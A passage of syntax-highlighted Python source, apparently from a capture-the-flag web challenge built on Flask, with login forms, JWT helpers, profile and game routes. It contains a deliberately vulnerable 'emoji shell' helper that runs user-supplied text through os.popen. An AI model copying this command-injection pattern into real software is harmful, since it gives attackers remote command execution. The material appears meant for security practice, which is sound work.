+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">intersection&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">set&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">printable&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">user_input&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">command&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">user_input&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;emoji shell&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">key&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">emoji_table&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">key&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">command&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">emoji_table&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">lower&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">command&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">command&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34; 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">LoginForm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FlaskForm&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">StringField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Username&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">validators&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">DataRequired&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">Length&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">min&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">max&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">PasswordField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Password&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">validators&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">DataRequired&lt;/span>&lt;span class="p">()])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">submit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SubmitField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Login&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">UploadForm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FlaskForm&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">avatar&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FileField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Choose a file&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">validators&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">DataRequired&lt;/span>&lt;span class="p">()])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">submit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SubmitField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">GameForm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FlaskForm&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_input&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">TextAreaField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Enter something&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">validators&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">DataRequired&lt;/span>&lt;span class="p">()])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">submit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">SubmitField&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Submit&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">generate_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">header&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;alg&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;RS256&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">jwt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">header&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">private_key&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">token&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decode_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">jwt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">public_key&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">payload&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="n">JoseError&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">login&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">form&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoginForm&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">validate_on_submit&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Invalid username or password&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;danger&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;guest&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">generate_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">make_response&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;dashboard&amp;#39;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set_cookie&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">token&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Login successful!&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;success&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">response&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Invalid username or password&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;danger&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/dashboard&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">dashboard&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">token&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Please login first&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;warning&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decode_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Invalid or expired token. Please login again.&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;danger&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;dashboard.html&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/profile&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">profile&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">token&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Please login first&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;warning&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decode_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Invalid or expired token. Please login again.&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;danger&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_info&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">user_info&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">({&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;profile.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">user_info&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">user_info&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/game&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">methods&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;GET&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">game&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">token&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">request&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cookies&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;token&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">form&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GameForm&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">token&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;Please login first&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;game.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">decode_jwt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">token&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;Invalid or expired token. Please login again.&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">render_template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;game.html&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">form&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">form&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">error_message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">error_message&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">payload&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;username&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
